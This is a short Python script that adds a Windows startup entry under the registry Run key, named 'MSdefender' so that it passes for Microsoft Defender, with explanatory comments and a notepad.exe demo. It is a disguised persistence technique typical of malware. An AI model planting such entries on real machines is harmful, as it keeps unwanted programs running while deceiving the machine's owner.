from winreg import QueryValueEx, OpenKey, HKEY_LOCAL_MACHINE, KEY_ALL_ACCESS, SetValueEx, REG_SZ

def add2Registery(filePath):

    # defining sub-keys
    runSubKey = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # Openning registry keys:
    # OpenKey(key, sub_key, reserved=0, access=KEY_READ)  
    # key is an open key or, a predefined key which in this case is for startup
    # sub_key is a string that identifies the sub_key to open. 
    # reserved is a reserved integer, and must be zero. The default is zero. 
    # access is an integer that specifies an access mask that describes the desired 
    # security access for the key. Default is KEY_READ. See Access Rights for other allowed values which 
    # in this case is 'KEY_ALL_ACCESS', that combines the STANDARD_RIGHTS_REQUIRED
    # HKEY_LOCAL_MACHINE: needs admin privs, in case you don't have it, use HKEY_CURRENT_USER 
    with OpenKey(HKEY_LOCAL_MACHINE, runSubKey, 0, KEY_ALL_ACCESS) as regObject:
        try:
            QueryValueEx(regObject, 'MSdefender')
        except:
            print ("registry doesn't exist, adding it now")

		    # SetValueEx: Stores data in the value field of open registry keys. 
		    # SetValueEx(key, value_name, reserved, type, value)
            SetValueEx(regObject, "MSdefender", 0, REG_SZ, filePath)


add2Registery('C:\\Windows\\System32\\notepad.exe')